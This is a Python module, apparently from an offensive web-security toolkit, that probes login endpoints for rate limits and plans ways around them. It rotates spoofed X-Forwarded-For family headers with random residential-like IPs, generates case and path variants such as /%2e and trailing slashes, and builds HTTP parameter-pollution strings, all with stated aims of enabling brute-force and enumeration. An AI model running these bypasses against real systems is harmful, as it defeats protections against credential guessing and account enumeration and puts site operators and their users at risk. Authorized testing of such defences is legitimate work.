"""Rate-limit probing + bypass.

Before brute-force or enumeration is feasible, we need to know:
  1. Does the endpoint rate-limit at all?
  2. If so — at what request count / time window?
  3. What dimension does it limit on?
       - IP address
       - Session cookie
       - Authorization token
       - User ID (for authenticated endpoints)
  4. Does header rotation bypass it?

Bypass techniques (in order of success rate in field research):

  A. **X-Forwarded-For / X-Real-IP rotation**  WordPress, Wordfence,
     and most custom PHP code read X-Forwarded-For as the "real" IP
     when a trusted proxy is configured. If the application trusts
     XFF without validating the source, rotating the XFF value gets
     new rate-limit buckets.

  B. **Case / path variation** — /login, /Login, /LOGIN, /login/,
     /login/. (trailing dot), /login?x=1. Some WAF rules match
     literal paths.

  C. **HTTP Parameter Pollution** — submit `user=a&user=b`. Rate
     limiter often keys on first occurrence; backend on last.

  D. **Multi-IP proxy fan-out** — rotate across N SOCKS5 proxies.
     The module exposes the interface; the operator supplies the pool.

All probe functions are pure planners; sending the HTTP is the
caller's responsibility (matches the pattern in argos.smuggle).
"""

from __future__ import annotations

import logging
import random
import string
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, Iterable, List, Optional, Tuple

logger = logging.getLogger("amoskys.argos.auth.ratelimit")


# ── Data model ────────────────────────────────────────────────────


@dataclass
class RateLimitFinding:
    technique: str
    severity: str = "info"
    evidence: str = ""
    bypass_recipe: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self):
        return {
            "technique": self.technique,
            "severity": self.severity,
            "evidence": self.evidence,
            "bypass_recipe": self.bypass_recipe,
            "metadata": dict(self.metadata),
        }


@dataclass
class RateLimitReport:
    target: str
    limit_requests: Optional[int] = None
    limit_window_s: Optional[int] = None
    limit_dimension: Optional[str] = None
    findings: List[RateLimitFinding] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    def to_dict(self):
        return {
            "target": self.target,
            "limit_requests": self.limit_requests,
            "limit_window_s": self.limit_window_s,
            "limit_dimension": self.limit_dimension,
            "findings": [f.to_dict() for f in self.findings],
            "errors": list(self.errors),
        }


# ── IP pool + header generators ───────────────────────────────────


def _random_ip() -> str:
    """RFC5737 TEST-NET-3 block 203.0.113.0/24 — safe for testing."""
    return f"203.0.113.{random.randint(1, 254)}"


def _random_residential_like_ip() -> str:
    """Non-doc IP emulating residential ranges. Operator uses only for
    their own infra or approved proxies."""
    first = random.choice([24, 45, 47, 68, 73, 76, 98, 104, 173, 184])
    return f"{first}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def _rotation_headers_iter(n: int, mode: str = "xff") -> Iterable[Dict[str, str]]:
    """Generator for N request-header dicts, each with a fresh proxy IP."""
    for _ in range(n):
        ip = _random_ip() if mode == "test-net" else _random_residential_like_ip()
        yield {
            "X-Forwarded-For": ip,
            "X-Real-IP": ip,
            "X-Originating-IP": ip,
            "X-Client-IP": ip,
            "X-Remote-IP": ip,
            "X-Remote-Addr": ip,
            "Forwarded": f"for={ip}",
        }


# ── Probe: threshold discovery ────────────────────────────────────


def probe_ratelimit(
    target_url: str,
    endpoint: str,
    method: str = "POST",
    sample_body: Optional[str] = None,
    max_requests: int = 60,
    request_interval_s: float = 0.5,
    sender: Optional[Callable] = None,
) -> RateLimitReport:
    """Discover rate-limit threshold by hammering from a single IP.

    sender(url, method, headers, body, timeout) -> (status, headers, body, elapsed_ms)

    Reads `Retry-After`, `X-RateLimit-*`, and 429 status to infer
    the limit. Stops early if 429 observed.
    """
    report = RateLimitReport(target=f"{target_url}{endpoint}")
    if sender is None:
        report.errors.append("no sender supplied — probe_ratelimit cannot run offline")
        return report

    start = time.time()
    statuses = []
    for i in range(max_requests):
        try:
            status, hdrs, _body, _elapsed = sender(
                f"{target_url}{endpoint}", method, {}, sample_body, 5.0
            )
        except Exception as exc:  # noqa: BLE001
            report.errors.append(f"request {i} failed: {exc}")
            break
        statuses.append(status)
        hdrs_lower = {k.lower(): v for k, v in (hdrs or {}).items()}

        # Check explicit rate-limit headers
        if "x-ratelimit-limit" in hdrs_lower and report.limit_requests is None:
            try:
                report.limit_requests = int(hdrs_lower["x-ratelimit-limit"])
            except ValueError:
                pass
        if "x-ratelimit-reset" in hdrs_lower:
            try:
                report.limit_window_s = int(hdrs_lower["x-ratelimit-reset"]) - int(
                    time.time()
                )
            except ValueError:
                pass

        if status == 429:
            elapsed = time.time() - start
            report.limit_requests = i + 1
            report.limit_window_s = int(elapsed) or 1
            retry = hdrs_lower.get("retry-after")
            ev = f"429 after {i + 1} requests in ~{elapsed:.1f}s"
            if retry:
                ev += f"; Retry-After: {retry}"
            report.findings.append(
                RateLimitFinding(
                    technique="ratelimit_threshold",
                    severity="info",
                    evidence=ev,
                    metadata={"hit_at_request": i + 1, "retry_after": retry},
                )
            )
            return report

        time.sleep(request_interval_s)

    # No 429 in max_requests — likely no limit or much higher
    report.findings.append(
        RateLimitFinding(
            technique="ratelimit_threshold",
            severity="info",
            evidence=f"no 429 observed across {max_requests} requests — limit absent or ≥ {max_requests}",
            metadata={"statuses_seen": list(set(statuses))},
        )
    )
    return report


# ── Bypass 1: header rotation ─────────────────────────────────────


def bypass_header_rotation(
    target_url: str,
    endpoint: str,
    confirmed_limit_requests: int = 10,
    attempt_count: int = 40,
    ip_mode: str = "test-net",
    method: str = "POST",
    sample_body: Optional[str] = None,
    sender: Optional[Callable] = None,
) -> RateLimitFinding:
    """Retry attempt_count times, rotating XFF-family headers each call.

    Counts non-429 successful requests; if we beat the baseline
    limit, rotation bypasses it.
    """
    if sender is None:
        return RateLimitFinding(
            technique="bypass_header_rotation",
            severity="info",
            evidence="no sender supplied",
        )
    success = 0
    throttled = 0
    for headers in _rotation_headers_iter(attempt_count, mode=ip_mode):
        try:
            status, _h, _b, _e = sender(
                f"{target_url}{endpoint}", method, headers, sample_body, 5.0
            )
        except Exception as exc:  # noqa: BLE001
            return RateLimitFinding(
                technique="bypass_header_rotation",
                severity="info",
                evidence=f"sender raised: {exc}",
            )
        if status == 429:
            throttled += 1
        else:
            success += 1
        time.sleep(0.05)
    beat = success > confirmed_limit_requests
    return RateLimitFinding(
        technique="bypass_header_rotation",
        severity="high" if beat else "info",
        evidence=(
            f"{success}/{attempt_count} non-429 with rotating XFF — "
            f"{'BYPASSED' if beat else 'did not exceed'} baseline limit "
            f"of {confirmed_limit_requests}"
        ),
        bypass_recipe=(
            (
                "Rotate X-Forwarded-For, X-Real-IP, X-Originating-IP, X-Client-IP, "
                "Forwarded headers per request. The backend trusts these for rate-"
                "limit attribution, so each fresh IP gets its own bucket."
            )
            if beat
            else ""
        ),
        metadata={
            "success": success,
            "throttled": throttled,
            "attempts": attempt_count,
            "bypassed": beat,
        },
    )


# ── Bypass 2: case variation ──────────────────────────────────────


def bypass_case_variation(endpoint: str) -> RateLimitFinding:
    """Generate case + path-shape variants of a URL suitable for
    retry bypass against literal-path-keyed rate limiters."""
    base = endpoint.rstrip("/")
    variants = list(
        dict.fromkeys(
            [
                base,
                base.upper(),
                base.lower(),
                base + "/",
                base + "//",
                base + "/.",
                base + "/%2e",
                base.replace("/", "//", 1),
                base + ";x=1",
                base + "?x=" + "".join(random.choices(string.ascii_lowercase, k=6)),
            ]
        )
    )
    return RateLimitFinding(
        technique="bypass_case_variation",
        severity="medium",
        evidence=f"{len(variants)} URL-shape variants generated for retry rotation",
        bypass_recipe=(
            "Cycle through these URL variants; literal-path-keyed limiters "
            "won't recognize them as the same endpoint. Trailing slash, "
            "case changes, and %2e are the most reliable."
        ),
        metadata={"variants": variants},
    )


# ── Bypass 3: parameter pollution ─────────────────────────────────


def bypass_param_pollution(
    endpoint: str, param_name: str, values: List[str]
) -> RateLimitFinding:
    """Build HPP variants for a given parameter.

    For `param_name="user"` and values=["a","b","c"]:
      out = "user=a&user=b&user=c"
    Rate-limit middleware that reads the LAST value will count
    each as a different user-id; the auth backend that reads the
    FIRST value will authenticate all as user "a". Mismatch =
    bypass.
    """
    if not values:
        return RateLimitFinding(
            technique="bypass_param_pollution",
            severity="info",
            evidence="no values supplied",
        )
    pollution_string = "&".join(f"{param_name}={v}" for v in values)
    return RateLimitFinding(
        technique="bypass_param_pollution",
        severity="medium",
        evidence=f"HPP recipe for '{param_name}' with {len(values)} values",
        bypass_recipe=(
            f"Append query string '{pollution_string}'. If the rate-limiter "
            "and auth stack disagree on first-vs-last parameter resolution, "
            "you get unmetered requests."
        ),
        metadata={"query_suffix": pollution_string, "count": len(values)},
    )


__all__ = [
    "RateLimitFinding",
    "RateLimitReport",
    "probe_ratelimit",
    "bypass_header_rotation",
    "bypass_case_variation",
    "bypass_param_pollution",
]
